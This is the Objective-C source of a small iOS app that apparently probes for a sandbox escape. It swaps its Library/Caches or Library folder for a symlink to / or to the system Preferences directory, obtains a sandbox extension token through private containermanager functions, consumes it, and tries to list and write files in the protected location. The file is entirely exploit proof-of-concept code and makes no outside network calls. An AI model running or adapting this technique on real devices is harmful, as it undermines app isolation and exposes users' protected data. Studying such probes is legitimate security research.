// sbclass2 — query the app's own MCM class-2 container after replacing its
// Library/Caches with a symlink to / or to a protected target.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <dirent.h>
#import <unistd.h>
#import <errno.h>
#import <sys/stat.h>
#import <fcntl.h>

typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void (*fn_xpc_release)(void *);

static fn_create q_create;
static fn_set_u64 q_class, q_part, q_flags;
static fn_set_obj q_ids;
static fn_get_one q_get;
static fn_copy_token q_token;
static fn_free q_free;
static fn_consume s_consume;
static fn_release s_release;
static fn_xpc_string xpc_string;
static fn_xpc_release xpc_release_fn;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[sbclass2] %@", s);
}

static BOOL load(void) {
    void *h = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!h) { L(@"dlopen fail"); return NO; }
    q_create = (fn_create)dlsym(h, "container_query_create");
    q_class = (fn_set_u64)dlsym(h, "container_query_set_class");
    q_ids = (fn_set_obj)dlsym(h, "container_query_set_identifiers");
    q_part = (fn_set_u64)dlsym(h, "container_query_operation_set_part");
    q_flags = (fn_set_u64)dlsym(h, "container_query_operation_set_flags");
    q_get = (fn_get_one)dlsym(h, "container_query_get_single_result");
    q_token = (fn_copy_token)dlsym(h, "container_copy_sandbox_token");
    q_free = (fn_free)dlsym(h, "container_query_free");
    s_consume = (fn_consume)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    s_release = (fn_release)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    xpc_string = (fn_xpc_string)dlsym(RTLD_DEFAULT, "xpc_string_create");
    xpc_release_fn = (fn_xpc_release)dlsym(RTLD_DEFAULT, "xpc_release");
    L(@"load q=%p get=%p tok=%p consume=%p", q_create, q_get, q_token, s_consume);
    return q_create && q_get && q_token && s_consume;
}

static void check(NSString *tag, NSString *target) {
    errno = 0;
    DIR *d = opendir(target.fileSystemRepresentation);
    L(@"[%@] opendir %@ -> %p errno=%d", tag, target, d, errno);
    if (d) closedir(d);
    NSString *m = [target stringByAppendingPathComponent:[NSString stringWithFormat:@"sbclass2_%@", tag]];
    errno = 0;
    int fd = open(m.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    L(@"[%@] write %@ -> fd=%d errno=%d", tag, m, fd, errno);
    if (fd >= 0) { write(fd, "x", 1); close(fd); unlink(m.fileSystemRepresentation); }
}

static char *query2(NSString *bid, NSString **pathOut) {
    void *q = q_create();
    q_class(q, 2);
    void *x = xpc_string ? xpc_string(bid.UTF8String) : NULL;
    q_ids(q, x);
    q_part(q, 3);
    q_flags(q, 0x8000000000ULL);
    void *res = q_get(q);
    const char *p = NULL; // container_object_get_path is null for this result
    char *tok = (res && q_token) ? q_token(res) : NULL;
    L(@"query2 res=%p tok=%s", res, tok ? "YES" : "NO");
    if (pathOut) *pathOut = p ? [NSString stringWithUTF8String:p] : nil;
    if (q_free) q_free(q);
    if (x && xpc_release_fn) xpc_release_fn(x);
    return tok;
}

static void runTest(NSString *tag, NSString *target, BOOL moveLibrary) {
    NSString *home = NSHomeDirectory();
    NSString *bid = [[NSBundle mainBundle] bundleIdentifier];
    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
    NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];
    NSString *bak = moveLibrary ? [home stringByAppendingPathComponent:@"Library.sb2"]
                                : [lib stringByAppendingPathComponent:@"Caches.sb2"];
    L(@"--- %@ target=%@ home=%@ bid=%@", tag, target, home, bid);
    struct stat st;
    if (lstat(bak.fileSystemRepresentation, &st) == 0) {
        L(@"stale backup exists, skip");
        return;
    }
    if (moveLibrary) {
        if (rename(lib.fileSystemRepresentation, bak.fileSystemRepresentation) != 0) {
            L(@"rename Library failed errno=%d", errno);
            return;
        }
        if (mkdir(lib.fileSystemRepresentation, 0755) != 0) {
            L(@"mkdir Library failed errno=%d", errno);
            rename(bak.fileSystemRepresentation, lib.fileSystemRepresentation);
            return;
        }
    } else {
        if (rename(caches.fileSystemRepresentation, bak.fileSystemRepresentation) != 0) {
            if (errno == ENOENT) {
                mkdir(lib.fileSystemRepresentation, 0755);
            } else {
                L(@"rename Caches failed errno=%d", errno);
                return;
            }
        }
    }
    unlink(caches.fileSystemRepresentation);
    if (symlink(target.fileSystemRepresentation, caches.fileSystemRepresentation) != 0) {
        L(@"symlink failed errno=%d", errno);
        goto restore;
    }
    {
        NSString *p = nil;
        char *tok = query2(bid, &p);
        if (tok) {
            L(@"tokenstr=%s", tok);
            int64_t h = s_consume(tok);
            L(@"consume=%lld", (long long)h);
            check(tag, target);
            if (h >= 0) s_release(h);
            free(tok);
        } else {
            check(tag, target);
        }
    }
restore:
    unlink(caches.fileSystemRepresentation);
    if (moveLibrary) {
        rmdir(lib.fileSystemRepresentation);
        rename(bak.fileSystemRepresentation, lib.fileSystemRepresentation);
    } else {
        rename(bak.fileSystemRepresentation, caches.fileSystemRepresentation);
    }
    L(@"--- %@ done", tag);
}

static void runProbe(void) {
    @autoreleasepool {
        L(@"=== sbclass2 start pid=%d", getpid());
        if (!load()) return;
        NSString *prefs = @"/var/mobile/Library/Preferences";
        check(@"before", prefs);
        runTest(@"caches-slash", @"/", NO);
        runTest(@"caches-prefs", prefs, NO);
        runTest(@"lib-slash", @"/", YES);
        runTest(@"lib-prefs", prefs, YES);
        L(@"=== sbclass2 done ===");
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    vc.view.backgroundColor = [UIColor systemBackgroundColor];
    UILabel *l = [[UILabel alloc] initWithFrame:vc.view.bounds];
    l.text = @"sbclass2"; l.textAlignment = NSTextAlignmentCenter;
    [vc.view addSubview:l];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{ runProbe(); });
    return YES;
}
@end
int main(int argc, char **argv) { @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class])); } }
